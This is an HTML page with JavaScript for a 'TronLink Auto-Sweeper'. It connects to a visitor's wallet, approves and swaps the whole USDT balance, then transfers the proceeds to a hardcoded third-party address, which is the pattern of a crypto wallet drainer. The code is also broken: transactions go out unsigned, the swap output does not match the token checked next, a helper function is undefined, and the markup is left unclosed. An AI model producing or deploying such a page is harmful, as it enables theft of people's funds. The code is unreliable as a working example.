<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>TronLink Auto-Sweeper</title>
 <!-- Load TronWeb from a working UMD build -->
 <script src="https://cdn.jsdelivr.net/npm/tronweb@6/dist/TronWeb.min.js"></script>
 <style>
 body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
 button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; transition: background 0.3s; }
 button:hover { background: #0056b3; }
 button:disabled { background: #555; cursor: not-allowed; }
 #status { margin-top: 20px; color: #00ff00; min-height: 20px; font-weight: bold; }
 .error { color: #ff4444 !important; }
 </style>
</head>
<body>
 <h2>🤖 TronLink Auto-Sweeper</h2>
 <p>Swaps USDT to WTRX on SunSwap and sends WTRX to Target.</p>
 
 <button id="sweepBtn" onclick="startSweep()">Start Sweep USDT -> WTRX</button>
 <div id="status">Ready</div>

 <script>
 const TARGET_ADDRESS = "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC";
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ";
 const WTRX = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR";
 const ROUTER = "TSSMTi2kRdFsAtPVv26Y6vYSMPA6smVq1o";

 async function startSweep() {
   const status = document.getElementById('status');
   const btn = document.getElementById('sweepBtn');
   status.classList.remove('error');
   btn.disabled = true;
   status.textContent = "Initializing...";

   try {
     if (!window.tronLink) throw new Error("TronLink extension not found!");

     // Wait for TronLink to be ready
     await new Promise((resolve, reject) => {
       let tries = 0;
       const iv = setInterval(() => {
         if (window.tronLink.ready) { clearInterval(iv); resolve(); }
         else if (++tries > 50) { clearInterval(iv); reject(new Error("Unlock TronLink and try again.")); }
       }, 100);
     });

     // Use TronLink's own TronWeb instance — it already has the signer wired up
     const tronWeb = window.tronLink.tronWeb;
     const userAddress = tronWeb.defaultAddress.base58;
     if (!userAddress) throw new Error("No address — unlock TronLink.");

     status.textContent = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     await sweep(tronWeb, status, userAddress);

   } catch (e) {
     status.textContent = "Error: " + e.message;
     status.classList.add('error');
     console.error(e);
   } finally {
     btn.disabled = false;
   }
 }

 async function sweep(tronWeb, statusEl, from) {
   // --- 1. Balance (raw units, USDT has 6 decimals) ---
   statusEl.textContent = "Checking USDT balance...";
   const balRaw = await tronWeb.trc20.getBalance(USDT, from);
   const balance = BigInt(balRaw || 0);
   if (balance === 0n) throw new Error("No USDT in wallet.");
   statusEl.textContent = `Found \${Number(balance) / 1e6} USDT. Approving...`;

   // --- 2. Approve router ---
   const approve = await tronWeb.transactionBuilder.triggerSmartContract(
     USDT,
     "approve(address,uint256)",
     { feeLimit: 100_000_000 },
     [
       { type: 'address', value: ROUTER },
       { type: 'uint256', value: balance.toString() }
     ],
     from
   );
   if (!approve.result?.result) throw new Error("Approval failed.");
   await tronWeb.trx.sendRawTransaction(approve.transaction);
   await waitForTx(tronWeb, approve.transaction.txID);

   // --- 3. Swap USDT -> WTRX ---
   statusEl.textContent = "Swapping...";
   const deadline = Math.floor(Date.now() / 1000) + 600;
   const swap = await tronWeb.transactionBuilder.triggerSmartContract(
     ROUTER,
     "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
     { feeLimit: 200_000_000 },
     [
       { type: 'uint256', value: balance.toString() },
       { type: 'uint256', value: '0' }, // min out (add slippage guard if you want)
       { type: 'address[]', value: [USDT, WTRX] },
       { type: 'address', value: from },
       { type: 'uint256', value: deadline.toString() }
     ],
     from
   );
   if (!swap.result?.result) throw new Error("Swap build failed.");
   await tronWeb.trx.sendRawTransaction(swap.transaction);
   await waitForTx(tronWeb, swap.transaction.txID);

   // --- 4. Send WTRX to target ---
   statusEl.textContent = "Withdrawing WTRX to target...";
   const wtrxRaw = await tronWeb.trc20.getBalance(WTRX, from);
   const wtrxBal = BigInt(wtrxRaw || 0);
   if (wtrxBal === 0n) throw new Error("WTRX balance is 0 after swap.");

   const tx = await tronWeb.transactionBuilder.triggerSmartContract(
     WTRX,
     "transfer(address,uint256)",
     { feeLimit: 50_000_000 },
     [
       { type: 'address', value: TARGET_ADDRESS },
       { type: 'uint256', value: wtrxBal.toString() }
     ],
     from
   );
   if (!tx.result?.result) throw new Error("Transfer build failed.");
   const signed = await tronWeb.trx.sign(tx.transaction);
   const sent = await tronWeb.trx.sendRawTransaction(signed);
   statusEl.textContent = `SUCCESS: \${sent.txid}`;
 }
